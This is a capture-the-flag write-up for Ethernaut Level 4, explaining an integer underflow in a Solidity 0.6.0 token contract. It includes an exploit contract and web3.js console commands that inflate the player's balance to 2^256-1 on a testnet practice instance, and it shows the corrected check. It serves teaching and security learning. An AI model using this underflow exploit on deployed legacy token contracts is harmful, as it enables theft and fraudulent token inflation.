> **⚠️ EDUCATIONAL PURPOSE ONLY**
> This document is part of the [Ethernaut CTF](https://ethernaut.openzeppelin.com/) educational security challenges.
> The techniques described here are for **authorized security testing and learning purposes only**.
> **DO NOT** use these methods on contracts you don't own or without explicit authorization.

---

# Ethernaut Level 4: Token - Exploitation Report

⚠️ **SPOILER ALERT** - This document contains the complete solution to Ethernaut Level 4.

## Objective
Exploit an integer underflow vulnerability in a basic ERC20 contract to obtain a massive number of tokens beyond the initial supply.

## 1. Vulnerability Analysis

### The Vulnerable Contract
The `Token.sol` contract implements a `transfer()` function with a flawed access control check:

```solidity
require(balances[msg.sender] - _value >= 0);
```

### Why It's Vulnerable
- **Solidity Version**: 0.6.0 lacks automatic arithmetic overflow/underflow checking (unlike 0.8.0+)
- **Dangerous Pattern**: Subtraction happens BEFORE comparison
- **Wraparound Effect**: When `balances[msg.sender] < _value`, the result wraps around to a massive positive number (2^256 - 1)
- **Result**: The `require()` falsely passes because the wrapped value is enormous and thus `>= 0`

For a detailed explanation of the mechanism, see [SEQUENCE_DIAGRAM.md](SEQUENCE_DIAGRAM.md).

### Comparison with Secure Implementation
See [COMPARISON.md](COMPARISON.md) to understand why `require(balances[msg.sender] >= _value)` would have blocked the exploit.

## 2. Exploitation Strategy

### Initial Approach (Failed)
1. Develop a `TokenExploit.sol` contract in Solidity 0.6.0
2. Deploy and execute via Remix or Foundry

**Problems Encountered**:
- Remix does not support Solidity 0.6.0
- Foundry (`forge-std`) requires Solidity 0.8.0+
- Sepolia opcodes have poor support for 0.6.0

### Attempted Exploit Contract
This contract was designed to trigger the underflow but couldn't be deployed due to tooling constraints:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenExploit {
    Token public token;

    constructor(address tokenAddress) public {
        token = Token(tokenAddress);
    }

    function exploit(address target) public {
        token.transfer(target, 21);
    }
}
```

### Working Approach (JavaScript via Console)
Ethernaut runs Hardhat as its backend, exposing `web3.js` in the browser console. This interface allows direct contract interaction without Forge or Remix.

**Advantages**:
- Compatible with Solidity 0.6.0
- Direct execution without deployment friction
- Native integration with wallet and Sepolia network

## 3. Exploit Execution

### Web3.js Command Sequence

**Step 1: Instantiate the contract**
```javascript
const tokenAddress = "0xc83179D577A7a05258f6CC5e7907fD5deC3820B1";
const tokenABI = [
  {
    "constant": false,
    "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
    "name": "transfer",
    "outputs": [{"name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];
const token = new web3.eth.Contract(tokenABI, tokenAddress);
```

**Explanation**: Creates a contract instance using the minimal ABI needed (transfer and balanceOf functions). Replace `tokenAddress` with your actual instance address from Ethernaut.

---

**Step 2: Verify initial balance**
```javascript
token.methods.balanceOf(player).call()
  .then(balance => console.log("Initial Balance:", balance))
  .catch(err => console.log("Error:", err));
```

**Explanation**: Checks your current balance (should be 20 tokens). The `player` variable is automatically provided by Ethernaut.

---

**Step 3: Trigger the underflow exploit**
```javascript
token.methods.transfer("0x0000000000000000000000000000000000000001", 21).send({from: player});
```

**Explanation**:
- Calls `transfer()` with 21 tokens
- Your balance is only 20, so `20 - 21` wraps to 2^256 - 1
- The `require()` check passes (huge number >= 0)
- Your balance becomes massively inflated
- The transaction is sent and mined on Sepolia

---

**Step 4: Verify the exploit succeeded**
```javascript
token.methods.balanceOf(player).call()
  .then(balance => console.log("Final Balance:", balance))
  .catch(err => console.log("Error:", err));
```

**Explanation**: Confirms your balance has become 2^256 - 1 (or close to it after transfers).

---

### Result
- Transaction successfully mined on Sepolia
- Balance transformed from 20 tokens → 2^256 - 1 tokens
- Level validated

## 4. Key Lessons

### Tools and Constraints
- **Legacy Solidity Versions**: Require alternative approaches (limited IDE/framework support)
- **Hardhat Backend**: Ethernaut uses Hardhat, providing web3.js access in console
- **Network Compatibility**: Some opcodes/versions may not be supported on all networks

### Security
- The absence of **SafeMath** in 0.6.0 was critical
- **Comparison patterns** matter more than language version
- Remix/Foundry detect these vulnerabilities in modern versions but aren't available for legacy code

### Future CTF Strategy
- Always seek alternatives when primary tools fail
- Ethernaut exposes `web3.js` as a direct exploitation option
- Verify target chain limitations (opcodes, compiler versions)
